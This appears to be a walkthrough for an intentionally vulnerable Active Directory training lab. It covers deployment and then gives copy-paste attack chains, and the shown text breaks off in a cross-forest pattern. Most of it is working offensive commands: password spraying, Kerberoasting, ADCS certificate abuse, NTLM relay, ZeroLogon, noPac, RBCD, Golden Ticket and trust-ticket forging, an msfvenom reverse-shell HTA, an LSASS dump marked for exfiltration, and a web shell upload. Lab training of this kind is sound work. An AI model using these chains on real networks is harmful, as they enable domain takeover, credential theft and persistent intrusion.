# DVAD WALKTHROUGH — Deploy → Attack → Full Forest Compromise

End-to-end operator walkthrough for the Damn Vulnerable Active Directory lab. This document is **copy-paste runnable** from a freshly-installed Linux host to "Enterprise Admin on every forest, persistence dropped, foreign forests pwned." Every command has been double-checked against the lab spec in `PLAN.md` and the role files under `ansible/roles/`.

> **Read first**: DVAD is intentionally vulnerable on every VM. **Never** run on a network you don't own; never expose the lab subnets directly to the internet. The WireGuard gateway in [`scripts/vps-wg-gateway.sh`](scripts/vps-wg-gateway.sh) is the only safe ingress for VPS deployments. The lab password (`DVADlab2024!`), krbtgt (`KrbtgtDVAD2024!`), and trust key (`TrustKey2024!`) are public — do not reuse them anywhere else.

---

## Table of contents

1. [Lab inventory](#1-lab-inventory) — what gets built
2. [Prerequisites](#2-prerequisites) — host setup
3. [Deploy](#3-deploy) — `./deploy.sh` walkthrough
4. [VPS deploy + WireGuard](#4-vps-deploy--wireguard) — remote attacker access
5. [Attacker box prep](#5-attacker-box-prep) — Kali / BlackArch tools, `/etc/hosts`, `krb5.conf`
6. [Verify the lab is alive](#6-verify-the-lab-is-alive)
7. [Phase 0 — Initial Access (no creds)](#7-phase-0--initial-access-no-creds)
8. [Phase 1 — Enumeration after foothold](#8-phase-1--enumeration-after-foothold)
9. [Canonical 5-minute solve](#9-canonical-5-minute-solve)
10. [Intra-forest attack patterns A–N](#10-intra-forest-attack-patterns-an)
11. [Cross-forest attack patterns P–Z](#11-cross-forest-attack-patterns-pz)
12. [Persistence playbook](#12-persistence-playbook)
13. [IA-001..050 — full deep-dives](#13-ia-001050--full-deep-dives)
14. [ENUM-001..080 — full deep-dives](#14-enum-001080--full-deep-dives)
15. [CRED-001..065 — credential access catalog](#15-cred-001065--credential-access-catalog)
16. [LAT-001..035 — lateral movement catalog](#16-lat-001035--lateral-movement-catalog)
17. [PE-001..060 — privilege escalation catalog](#17-pe-001060--privilege-escalation-catalog)
18. [PER-001..037 — persistence catalog](#18-per-001037--persistence-catalog)
19. [DF-001..040 — domain/forest compromise catalog](#19-df-001040--domainforest-compromise-catalog)
20. [Per-host crib sheets](#20-per-host-crib-sheets)
21. [ESC1–ESC16 cookbook](#21-esc1esc16-cookbook)
22. [Multi-pattern pivot chains](#22-multi-pattern-pivot-chains)
23. [MITRE ATT&CK mapping](#23-mitre-attck-mapping)
24. [Detection & telemetry notes](#24-detection--telemetry-notes)
25. [Operator playbook — daily rhythms](#25-operator-playbook--daily-rhythms)
26. [Red-team report templates](#26-red-team-report-templates)
27. [Lab-extension recipes](#27-lab-extension-recipes)
28. [Cleanup and reset](#28-cleanup-and-reset)
29. [Troubleshooting](#29-troubleshooting)
30. [References](#30-references)

---

## 1. Lab inventory

| VM | IP | Forest | Role | Bridge |
|---|---|---|---|---|
| `dc01.corp.local` | `10.10.0.10` | corp.local | Primary DC, DNS, ADCS schema | `dvad-ctf` |
| `dc01.eu.corp.local` | `10.10.0.11` | eu.corp.local | Child DC (parent-child trust) | `dvad-ctf` |
| `ca01.corp.local` | `10.10.0.12` | corp.local | Enterprise CA (ESC1..16 templates) | `dvad-ctf` |
| `file01.corp.local` | `10.10.0.13` | corp.local | File server, SMB1, NFS, FTP, Telnet | `dvad-ctf` |
| `sql01.corp.local` | `10.10.0.14` | corp.local | MSSQL (mixed-mode, xp_cmdshell) | `dvad-ctf` |
| `ws01.corp.local` | `10.10.0.100` | corp.local | Victim workstation (phishing landing) | `dvad-ctf` |
| `dc01.finance.local` | `10.20.0.10` | finance.local | External trust DC | `dvad-finance` |
| `dc01.root.corp` | `10.30.0.10` | root.corp | Tree-root trust DC | `dvad-root` |

**Lab credentials (public — do not reuse):**

| Account | Password |
|---|---|
| Any domain user (alice, bob, svc_web, …) | `DVADlab2024!` |
| `krbtgt` (every domain) | `KrbtgtDVAD2024!` |
| Trust keys (corp↔finance, corp↔root) | `TrustKey2024!` |
| `sa` on sql01 | `SqlServer2025!` |
| `MachineAccountQuota` | `10` (per user) |

**Flag manifest:** 382 IDs across 8 categories (Recon, InitialAccess, Enumeration, Credential, Lateral, PrivilegeEsc, Persistence, DomainForest). Each VM gets a per-host `C:\Flags\FLAG-<id>-<cat>.txt` set; full ACL tiers are in `ansible/roles/flag_factory/`.

---

## 2. Prerequisites

A single Linux host with hardware virtualization. Detected distros: Debian / Ubuntu / Mint / Pop!_OS, Fedora / RHEL / Rocky / Alma, Arch / Manjaro, openSUSE.

| Profile | RAM | vCPU | Disk |
|---|---|---|---|
| `--single-dc` | 4 GB | 2 | 30 GB |
| `--minimal` | 12 GB | 6 | 80 GB |
| full (default) | 18 GB | 10 | 120 GB |
| `--vps` (headless) | 24 GB | 8 | 150 GB |

Quick capability checks before you start:

```bash
# CPU virtualization extensions present?
grep -Eo '(vmx|svm)' /proc/cpuinfo | sort -u                 # vmx (Intel) or svm (AMD)

# KVM module loaded?
lsmod | grep -E '^kvm'                                       # kvm_intel or kvm_amd

# Enough free RAM/disk?
free -h && df -h .

# Hardware nested virt enabled (only matters if YOU are on a VM)?
cat /sys/module/kvm_intel/parameters/nested 2>/dev/null      # should print Y or 1
```

If any of those checks fail, fix them before running deploy.sh — it cannot recover.

---

## 3. Deploy

```bash
git clone <this-repo> DVAD
cd DVAD

# Full lab (8 VMs):
./deploy.sh

# Smaller variants:
./deploy.sh --minimal       # corp.local only, 5 VMs
./deploy.sh --single-dc     # dc01 only, smoke test
./deploy.sh --memory 24 --cpus 12 --disk-path /mnt/vms

# Headless / VPS:
./deploy.sh --vps           # VNC pinned to 127.0.0.1, capacity pre-flight
```

`deploy.sh` runs 7 phases. Total time: **45–90 minutes** for a full first run (Windows install is the bottleneck). Subsequent re-runs of Ansible alone take minutes.

1. **Dependency install** — qemu/libvirt/swtpm/ovmf/ansible/dnsmasq, per-distro
2. **Network setup** — three Linux bridges (`dvad-ctf`, `dvad-finance`, `dvad-root`), per-project dnsmasq under `/tmp/dvad-dnsmasq/`, nftables NAT to the host's default route
3. **Windows media** — pulls Server 2022 ISO + virtio-win into `media/` (skips if present)
4. **VM creation** — generates per-VM `autounattend.xml` and `post-install.ps1`, boots VMs in install mode
5. **Wait loop** — `scripts/wait-vms.sh` blocks on per-VM `.installed` markers
6. **Activation** — runs Massgrave on each VM (best-effort, ignore failures)
7. **Ansible provisioning** — `playbooks/site.yml` runs 12 phases: domain promotion → trusts → ADCS → users → recon vulns → cred-access vulns → lateral vulns → ACL abuse → privesc → persistence → forest compromise → flag drop

**Important note (you will hit this):** the script adds your user to the `kvm` and `libvirt` groups but the same shell can't see it. **Log out and back in** before re-running.

To re-run just Ansible after the VMs are up (the most common iterative loop):

```bash
cd ansible
ansible-playbook -i inventory.yml playbooks/site.yml --syntax-check
ansible-playbook -i inventory.yml playbooks/site.yml --check -v          # dry run
ansible-playbook -i inventory.yml playbooks/site.yml -v                  # real run
# Subset by tag:
ansible-playbook -i inventory.yml playbooks/site.yml --tags windows_base
```

---

## 4. VPS deploy + WireGuard

On the VPS:

```bash
ssh root@<vps>
git clone <this-repo> DVAD
cd DVAD
./deploy.sh --vps                                  # ~24 GB RAM recommended
sudo bash scripts/vps-wg-gateway.sh up             # writes ./dvad-attacker.conf
```

The gateway script:

1. Installs `wireguard-tools` (apt/dnf/pacman/zypper auto-detected).
2. Generates server + client keypairs in `/etc/wireguard/`.
3. Writes `/etc/wireguard/wg-dvad.conf` (listens on `51820/udp`).
4. Enables IPv4 forwarding + NAT for the attacker subnet (`10.99.0.0/24`) into the three lab bridges.
5. Brings up the interface with `wg-quick` and enables it on boot.
6. Prints the attacker conf to stdout AND writes it to `./dvad-attacker.conf`.

Optional firewall hardening on the VPS (do this — leaving SMB/LDAP/RDP open is reckless):

```bash
# UFW (Debian/Ubuntu)
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp                # SSH — ideally lock to your /32
ufw allow 51820/udp             # WireGuard
ufw enable

# nftables (RHEL/Fedora/Arch)
nft add table inet dvad
nft add chain inet dvad input '{ type filter hook input priority 0 ; policy drop ; }'
nft add rule inet dvad input ct state established,related accept
nft add rule inet dvad input iif lo accept
nft add rule inet dvad input tcp dport 22 accept
nft add rule inet dvad input udp dport 51820 accept
```

On the attacker laptop:

```bash
scp root@<vps>:DVAD/dvad-attacker.conf .
sudo wg-quick up ./dvad-attacker.conf
ping -c1 10.10.0.10
sudo wg show
```

VNC console over SSH when something is wedged:

```bash
ssh -L 5901:127.0.0.1:5901 root@<vps>
vncviewer 127.0.0.1:5901          # in another terminal
```

VNC port per VM is in `qemu/vm-create.sh` (`VM_DEFS` table). See [`docs/09-vps-deploy.md`](docs/09-vps-deploy.md) for the full threat-model rationale.

---

## 5. Attacker box prep

DVAD assumes you attack **from your own** Kali / BlackArch / Parrot — `ws01.corp.local` is a *victim*, not a workstation. The attacker box sits on the host bridge (or, in VPS mode, on the WireGuard tunnel).

Install the canonical impacket/certipy stack:

```bash
# Kali — most of these are already packaged:
sudo apt update && sudo apt install -y \
    impacket-scripts python3-impacket python3-ldap3 python3-pyasn1 \
    bloodhound netexec evil-winrm enum4linux-ng smbmap \
    responder mitm6 kerbrute python3-certipy \
    rdate sleuthkit nmap masscan rustscan ldap-utils \
    krb5-user smbclient cifs-utils python3-pwntools

# Tools that need pip:
pip install --user 'impacket==0.12.0' 'certipy-ad>=4.8' 'bloodhound-python>=1.7' \
                    'minikerberos>=0.4' 'masky>=0.2' 'krbjack'

# Pull Rubeus + Mimikatz + SharpHound (Windows binaries — drop on victim or run via Mono)
git clone https://github.com/GhostPack/Rubeus.git
git clone https://github.com/gentilkiwi/mimikatz.git
git clone https://github.com/BloodHoundAD/SharpHound.git
```

Make lab hosts resolvable on the attacker laptop:

```bash
sudo tee -a /etc/hosts <<'EOF'
10.10.0.10   dc01.corp.local corp.local
10.10.0.11   dc01.eu.corp.local eu.corp.local
10.10.0.12   ca01.corp.local
10.10.0.13   file01.corp.local
10.10.0.14   sql01.corp.local
10.10.0.100  ws01.corp.local
10.20.0.10   dc01.finance.local finance.local
10.30.0.10   dc01.root.corp root.corp
EOF
```

Kerberos config (`/etc/krb5.conf`) — required for `impacket-*` `-k` runs:

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false
    forwardable = true
    ticket_lifetime = 24h
    renew_lifetime = 7d

[realms]
    CORP.LOCAL    = { kdc = dc01.corp.local    admin_server = dc01.corp.local }
    EU.CORP.LOCAL = { kdc = dc01.eu.corp.local admin_server = dc01.eu.corp.local }
    FINANCE.LOCAL = { kdc = dc01.finance.local admin_server = dc01.finance.local }
    ROOT.CORP     = { kdc = dc01.root.corp     admin_server = dc01.root.corp }

[domain_realm]
    .corp.local    = CORP.LOCAL
    .eu.corp.local = EU.CORP.LOCAL
    .finance.local = FINANCE.LOCAL
    .root.corp     = ROOT.CORP
```

Time-sync to the DC (Kerberos rejects > 5 min skew):

```bash
sudo rdate -n 10.10.0.10
# or:
sudo ntpdate 10.10.0.10
```

---

## 6. Verify the lab is alive

```bash
# L3 reachability across all three subnets
for ip in 10.10.0.10 10.10.0.11 10.10.0.12 10.10.0.13 10.10.0.14 10.10.0.100 10.20.0.10 10.30.0.10; do
    ping -c1 -W1 "$ip" >/dev/null && echo "OK  $ip" || echo "DOWN $ip"
done

# Domain controllers expose Kerberos and LDAP
nmap -p 88,389,445,636,3268 -sV 10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10

# Authenticated WinRM smoke test (Ansible uses this)
evil-winrm -i 10.10.0.10 -u Administrator -p 'DVADlab2024!'

# Verify ENUM surface playbook landed:
nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -x 'dir C:\Windows\Temp\DVAD_ENUM_SURFACE_ENABLED'
```

If any of the DCs are unreachable, check the bridge:

```bash
ip -br link show | grep dvad
sudo bash qemu/network/setup-network.sh status
```

---

## 7. Phase 0 — Initial Access (no creds)

DVAD's `IA-001..IA-050` are the **zero-credential** entry points. You will use ~3–5 of these in any given run. Full coverage is in [`docs/02a-initial-access.md`](docs/02a-initial-access.md). Hot-path commands:

### IA-001..IA-005: Anonymous + Kerberos enum

```bash
# Anonymous SMB null session (RestrictAnonymous=0 lab-wide)
nxc smb 10.10.0.10 -u '' -p '' --shares
enum4linux-ng -A 10.10.0.10

# Anonymous LDAP bind (dsHeuristics permits anon read)
ldapsearch -x -H ldap://10.10.0.10 -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName | grep sAMAccountName

# DNS AXFR (every DC has SecureSecondaries=TransferAnyServer)
dig axfr corp.local @10.10.0.10
dig axfr finance.local @10.20.0.10
dig axfr root.corp @10.30.0.10

# Kerbrute userenum (KDC returns PRINCIPAL_UNKNOWN vs CLIENT_REVOKED)
kerbrute userenum -d corp.local --dc 10.10.0.10 /usr/share/seclists/Usernames/Names/names.txt

# AS-REP roast — svc_nopreauth has DoNotRequirePreAuth set
impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass \
                    -usersfile users.txt -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### IA-006..IA-010: Spray + anonymous services

```bash
# Password spray (~15% of accounts have weak/default)
nxc smb 10.10.0.10 -u users.txt -p 'DVADlab2024!' --continue-on-success
nxc smb 10.10.0.10 -u users.txt -p 'Summer2024!' --continue-on-success
nxc smb 10.10.0.10 -u users.txt -p 'Welcome1' --continue-on-success

# Anonymous SMB share read on file01 (guest enabled)
smbclient -L //10.10.0.13 -N
smbclient //10.10.0.13/Public -N -c 'recurse on; ls'

# Anonymous FTP on file01 (IIS Web-Ftp-Server, anon allowed)
curl ftp://10.10.0.13/

# Anonymous NFS on file01 (EnableAnonymousAccess=$true, UID 65534)
showmount -e 10.10.0.13
sudo mount -t nfs 10.10.0.13:/DVAD_NFS /mnt/nfs
```

### IA-011..IA-018: MSSQL, WinRM, RDP, coercion, EternalBlue, ZeroLogon

```bash
# MSSQL — sa with weak pass, xp_cmdshell on, public has UNSAFE assembly
impacket-mssqlclient 'sa:SqlServer2025!@10.10.0.14' -windows-auth
sqsh -S 10.10.0.14 -U sa -P 'SqlServer2025!' -C "EXEC xp_cmdshell 'whoami'"

# WinRM (5985 plaintext is on by default after post-install)
evil-winrm -i 10.10.0.100 -u Administrator -p 'DVADlab2024!'

# RDP — NLA disabled on ws01 (BlueKeep-style reachable)
xfreerdp /v:10.10.0.100 /u:Administrator /p:'DVADlab2024!' +sec-nla

# PetitPotam coercion (lab-wide DC vuln)
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support &
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10

# EternalBlue (SMB1 only on file01)
nmap --script smb-vuln-ms17-010 -p445 10.10.0.13
msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set RHOSTS 10.10.0.13; set LHOST 10.10.0.1; run"

# ZeroLogon (FullSecureChannelProtection=0)
python3 zerologon_tester.py DC01 10.10.0.10
python3 set_empty_pw.py DC01 10.10.0.10
impacket-secretsdump -no-pass -just-dc corp.local/dc01\$@10.10.0.10
# CRITICAL: restore DC$ password afterwards or AD will break
python3 reinstall_original_pw.py DC01 10.10.0.10 <hex_pw_from_secretsdump>
```

### IA-019..IA-033: Phishing, mitm6, WPAD, web app RCE, SCCM, USB

```bash
# Phishing payloads (macro/LNK/library-ms/HTA)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f hta-psh > stage1.hta
python3 -m http.server 8080

# mitm6 + ntlmrelayx (IPv6 DHCP takeover)
sudo mitm6 -d corp.local -i <iface> &
sudo impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local -wh wpad.corp.local \
                         --delegate-access --no-smb-server

# Responder (LLMNR/NBT-NS poisoning — lab-wide enabled)
sudo responder -I <iface> -wv

# library-ms NTLM leak (CVE-2025-24071)
cat > 'Salaries_Q3.library-ms' <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation><url>\\10.10.0.1\share</url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
EOF
zip 'Salaries_Q3.zip' 'Salaries_Q3.library-ms'
```

### IA-034..IA-050: ENUM-surface-driven entries

```bash
# SNMP public + private community strings (lab-wide on every server)
snmpwalk -v2c -c public 10.10.0.13
snmpset -v2c -c private 10.10.0.13 .1.3.6.1.4.1.77.1.2.25.1.1.1 s 'ATTACK'

# IIS WebDAV PROPFIND + PUT on ca01
curl -X PROPFIND http://10.10.0.12/ -H 'Depth: 1'
curl -T shell.aspx 'http://10.10.0.12/uploads/shell.aspx;.txt'   # extension trick

# WinRM HTTPS (5986) — self-signed cert on every host
evil-winrm -i 10.10.0.10 -u Administrator -p 'DVADlab2024!' -S

# Telnet (file01, only meaningful on Server 2016 builds)
telnet 10.10.0.13 23

# Spooler / PrinterBug from any member
python3 printerbug.py 'corp.local/alice:DVADlab2024!'@10.10.0.13 10.10.0.1
```

See [`docs/02a-initial-access.md`](docs/02a-initial-access.md) for the rest of IA-001..050 with full per-technique writeups.

---

## 8. Phase 1 — Enumeration after foothold

Once you have **any** authenticated identity (anonymous bind, low-priv user, machine account, ticket), DVAD's `ENUM-001..080` opens the full Windows / AD recon surface. Catalog in [`docs/02b-enumeration.md`](docs/02b-enumeration.md); per-host crib sheets in [`docs/hosts/`](docs/hosts/).

```bash
# AD-wide enum with BloodHound
bloodhound-python -u alice -p 'DVADlab2024!' -d corp.local -dc dc01.corp.local \
                  -c all -ns 10.10.0.10 --zip
# Import the zip into BloodHound CE/Legacy and run pre-built queries:
#   - "Shortest path to Domain Admins"
#   - "Find all Kerberoastable users"
#   - "Find ADCS escalations"
#   - "Cross-forest" path queries (DVAD adds trust edges)

# Lightweight nxc sweeps
nxc smb     10.10.0.0/24 -u alice -p 'DVADlab2024!' --shares
nxc smb     10.10.0.0/24 -u alice -p 'DVADlab2024!' --pass-pol
nxc ldap    10.10.0.10   -u alice -p 'DVADlab2024!' --kerberoasting all
nxc ldap    10.10.0.10   -u alice -p 'DVADlab2024!' --asreproast all
nxc ldap    10.10.0.10   -u alice -p 'DVADlab2024!' --trusted-for-delegation
nxc ldap    10.10.0.10   -u alice -p 'DVADlab2024!' --gmsa
nxc mssql   10.10.0.14   -u alice -p 'DVADlab2024!' -M mssql_priv

# Certipy — find ESC-vulnerable templates
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable

# Inspect a specific host for null-session pipes (ENUM-021..030)
rpcdump.py 10.10.0.10
impacket-lookupsid 10.10.0.10/alice:'DVADlab2024!'@10.10.0.10 20000

# Trust enum (cross-forest paths)
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M enum_trusts
nltest /domain_trusts /v                        # on a Windows host
```

---

## 9. Canonical 5-minute solve

The fastest path to Domain Admin on `corp.local` from a zero-credential start. Use it as a smoke test after every redeploy.

```bash
# (a) Anonymous user enum
nxc smb 10.10.0.10 -u '' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | awk '{print $6}' | cut -d\\ -f2 > users.txt

# (b) Password spray — DVAD's default
nxc smb 10.10.0.10 -u users.txt -p 'DVADlab2024!' --continue-on-success | grep '\[+\]'
#  → alice : DVADlab2024!  works

# (c) Kerberoast every SPN with alice's creds
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
#  → svc_web : Summer2023!

# (d) Find ADCS ESC1 template
certipy find -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 -stdout -vulnerable
#  → ESC1Template (Domain Users enroll, ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU)

# (e) Request a cert as Administrator
certipy req -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
            -ca CORP-CA -template ESC1Template -upn 'Administrator@corp.local'

# (f) PKINIT → TGT + NT hash for Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
#  → NT hash for Administrator@CORP.LOCAL

# (g) DCSync — extract krbtgt
impacket-secretsdump -hashes :<NT> -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
#  → krbtgt:aad3b435...:<hash>

# (h) Forge a Golden Ticket for persistence
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local
#  → NT AUTHORITY\SYSTEM on dc01
```

Time on a warm lab: **~5 minutes**. If you spend longer, the playbook didn't finish — re-run `ansible-playbook ... site.yml --tags vuln_recon,vuln_cred_access,vuln_lateral,vuln_acl`.

---

## 10. Intra-forest attack patterns A–N

Each pattern is a self-contained chain. Pre-condition is "any authenticated low-priv user" (typically `alice`). Outcome is Domain Admin on `corp.local`.

For wireframe diagrams + detection notes, see [`docs/08-solve-path.md`](docs/08-solve-path.md).

### Pattern A — Kerberoast → second-hop

```bash
impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
# svc_web : Summer2023!

# Where is svc_web a local admin?
nxc smb 10.10.0.0/24 -u svc_web -p 'Summer2023!' --local-auth
nxc smb 10.10.0.0/24 -u svc_web -p 'Summer2023!'

# If svc_web has constrained delegation:
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator \
               corp.local/svc_web:'Summer2023!' -dc-ip 10.10.0.10
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
```

### Pattern B — ADCS ESC1

```bash
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
certipy req  -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
             -ca CORP-CA -template ESC1Template -upn 'Administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
impacket-secretsdump -hashes :<NT> -just-dc corp.local/Administrator@10.10.0.10
```

### Pattern C — Coerce + Relay → ESC8

```bash
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support &
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
echo '<b64>' | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10 -username 'dc01$' -domain corp.local
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/dc01\$@dc01.corp.local
```

Alternative coercers if PetitPotam is patched (it isn't, in DVAD):

```bash
impacket-coercer  -u alice -p 'DVADlab2024!' -d corp.local -t 10.10.0.10 -l 10.10.0.1
python3 dfscoerce.py -d corp.local -u alice -p 'DVADlab2024!' 10.10.0.1 10.10.0.10
python3 printerbug.py 'corp.local/alice:DVADlab2024!'@10.10.0.10 10.10.0.1
```

### Pattern D — RBCD (Resource-Based Constrained Delegation)

```bash
# Create attacker-controlled machine account (MAQ=10)
impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' \
                     -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10

# Write RBCD attribute on target (ws01$)
impacket-rbcd -delegate-from 'evil$' -delegate-to 'ws01$' -dc-ip 10.10.0.10 \
              -action write corp.local/alice:'DVADlab2024!'

# S4U2Self+S4U2Proxy → CIFS ticket as Administrator
impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
               corp.local/evil\$:'EvilPass1!' -dc-ip 10.10.0.10

export KRB5CCNAME=Administrator@cifs_ws01.corp.local@CORP.LOCAL.ccache
impacket-psexec -k -no-pass ws01.corp.local
```

### Pattern E — noPac (CVE-2021-42278/42287)

```bash
impacket-noPac.py corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
                  -dc-host dc01.corp.local -shell --impersonate Administrator
```

Manual variant (when the auto script fails):

```bash
impacket-addcomputer corp.local/alice:'DVADlab2024!' -computer-name 'evil$' -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
impacket-renameMachine corp.local/alice:'DVADlab2024!' -current-name 'evil$' -new-name 'dc01' -dc-ip 10.10.0.10
impacket-getTGT corp.local/dc01:'EvilPass1!' -dc-ip 10.10.0.10
impacket-renameMachine corp.local/alice:'DVADlab2024!' -current-name 'dc01' -new-name 'evil$' -dc-ip 10.10.0.10
KRB5CCNAME=dc01.ccache impacket-getST -self -impersonate Administrator -spn 'cifs/dc01.corp.local' -k -no-pass corp.local/dc01
KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass dc01.corp.local
```

### Pattern F — ZeroLogon (CVE-2020-1472)

```bash
python3 zerologon_tester.py DC01 10.10.0.10
python3 set_empty_pw.py DC01 10.10.0.10
impacket-secretsdump -no-pass -just-dc corp.local/dc01\$@10.10.0.10
# *** RESTORE DC$ PASSWORD ***
python3 reinstall_original_pw.py DC01 10.10.0.10 <hex_pw_from_secretsdump>
```

If you forget the restore, every member fails to authenticate (NETLOGON channel is broken) — you'll need to redeploy.

### Pattern G — ExtraSID (Child eu → Parent corp)

```bash
# Prereq: DA@eu.corp.local
impacket-secretsdump -just-dc-user krbtgt eu.corp.local/Administrator@10.10.0.11
impacket-lookupsid eu.corp.local/Administrator@10.10.0.11 | grep -iE 'domain|krbtgt'
# CORP_SID = lookupsid corp.local

impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.corp.local \
                  -extra-sid <CORP_SID>-519,<CORP_SID>-512 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
```

### Pattern H — Golden Ticket persistence

```bash
# krbtgt is fixed at KrbtgtDVAD2024! — NT hash is deterministic
python3 -c "import hashlib; print(hashlib.new('md4', 'KrbtgtDVAD2024!'.encode('utf-16-le')).hexdigest())"

# Forge for any principal, 10-year lifetime
impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.local
```

### Pattern I — Cross-forest trust ticket (corp → finance)

```bash
impacket-secretsdump -just-dc-user 'finance.local$' corp.local/Administrator@10.10.0.10
impacket-ticketer -nthash <trustkey_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <FIN_SID>-519 -spn 'krbtgt/finance.local' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.finance.local -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finance.local
```

### Pattern J — Phishing → ws01 → in-memory creds → pivot

```bash
# Build payload, deliver via the IA-019 chain, then on ws01:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\l.dmp full
# exfil and parse offline
pypykatz lsa minidump l.dmp

# Pivot
proxychains4 -q nxc smb 10.10.0.13 -u alice -H <NTLM>
```

### Pattern K — mitm6 + RBCD

```bash
sudo mitm6 -d corp.local -i <iface> &
sudo impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local -wh wpad.corp.local \
                         --delegate-access --no-smb-server

# After ntlmrelayx prints "set msDS-AllowedToActOnBehalfOfOtherIdentity":
impacket-getST -spn cifs/<victim>.corp.local -impersonate Administrator \
               corp.local/<evil_machine>\$:'<pwd>' -dc-ip 10.10.0.10
KRB5CCNAME=Administrator@cifs_<victim>.corp.local@CORP.LOCAL.ccache \
    impacket-psexec -k -no-pass <victim>.corp.local
```

### Pattern L — ProxyShell (Exchange — operator-extended lab)

DVAD doesn't ship Exchange by default; add a vulnerable VM if you want this surface.

```bash
python3 ProxyShell.py -t https://exchange.corp.local -e Administrator@corp.local
python3 ProxyShell-Auto.py --target exchange.corp.local --email Administrator@corp.local
curl 'https://exchange.corp.local/aspnet_client/shell.aspx?cmd=whoami'
```

### Pattern M — SCCM PXE NAA harvest (operator-extended)

```bash
python3 PXEThief.py -d corp.local --target ws-pxe.corp.local
python3 pxe_thief_decrypt.py policy.xml
nxc smb 10.10.0.0/24 -u <NAA_USER> -p '<NAA_PASS>'
```

### Pattern N — USB / library-ms drop

```bash
# Build .library-ms with attacker UNC, zip it, drop a USB or email it
sudo responder -I <iface> -wv
# When victim previews:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 11. Cross-forest attack patterns P–Z

These exercise the multi-forest topology that the canonical solve never touches.
Pre-condition for most: DA on `corp.local` (typically achieved via patterns A–N).
Outcome: DA or EA on the foreign forest, then permanent cross-forest persistence.

### Pattern P — ExtraSID (corp → eu, reverse of G)

```bash
impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
impacket-lookupsid corp.local/Administrator@10.10.0.10 'eu.corp.local' | head
impacket-ticketer -nthash <corp_krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <EU_SID>-512 -spn 'krbtgt/eu.corp.local' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.eu.corp.local -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc eu.corp.local/Administrator@dc01.eu.corp.local
```

### Pattern Q — Trust key forge → finance.local (external trust)

```bash
impacket-secretsdump -just-dc-user 'FINANCE$' corp.local/Administrator@10.10.0.10
impacket-lookupsid finance.local/<low_priv>:'<pw>'@10.20.0.10 | grep -i 'enterprise'
